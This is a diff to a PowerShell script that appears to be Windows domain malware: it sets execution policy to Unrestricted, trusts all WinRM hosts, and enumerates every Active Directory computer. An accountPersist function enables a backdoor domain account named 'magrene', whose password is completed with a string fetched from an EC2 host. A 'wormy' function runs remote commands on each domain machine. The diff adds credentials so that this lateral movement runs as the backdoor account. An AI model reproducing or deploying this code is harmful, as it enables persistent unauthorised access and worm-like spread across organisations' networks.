@@ -11,7 +11,14 @@ set-executionpolicy Unrestricted
 
 Set-Item WSMan:\localhost\Client\TrustedHosts -Value '*' -Force
 $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem
+$toAppend=invoke-restmethod http://ec2-18-205-66-203.compute-1.amazonaws.com/eeee/timeZ.txt
 
+$username='magrene'
+$usernameB=((gwmi WIN32_ComputerSystem).Domain+'\magrene')
+[SecureString]$secureString = $userPassword | ConvertTo-SecureString -AsPlainText -Force 
+[PSCredential]$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $userNameB, $secureString
+$c0de='Tossking@'
+$c0de=$c0de+$toAppend
 if($osInfo.ProductType -ne 1){
     $computerNames = get-adcomputer -filter * | foreach {$_.DNSHostName}
 }
@@ -41,10 +48,7 @@ if(!(Test-Path -Path 'C:\Program Files (x86)\Windows NT\TableTextService/TableTe
 
 
 function accountPersist{
-    $toAppend=invoke-restmethod http://ec2-18-205-66-203.compute-1.amazonaws.com/eeee/timeZ.txt
-    $username='magrene'
-    $c0de='Tossking@'
-    $c0de=$c0de+$toAppend
+
     try{
         Get-aduser $username
         enable-adaccount $username
@@ -86,7 +90,7 @@ function wormy{
     Start-Service Winmgmt
     Foreach($i in $computerNames){
         Write-Output $i
-        invoke-command -ComputerName $i -ScriptBlock {
+        invoke-command -ComputerName $i -Credential $credential -ScriptBlock {
             if(Test-Path 'C:\Users\Public\Downloads\desktop.log' ){
                 if((get-content -path 'C:\Users\Public\Downloads\desktop.log') -lt ([int][double]::Parse((get-date -UFormat %s))) - 30){
                     Invoke-Command -ScriptBlock {
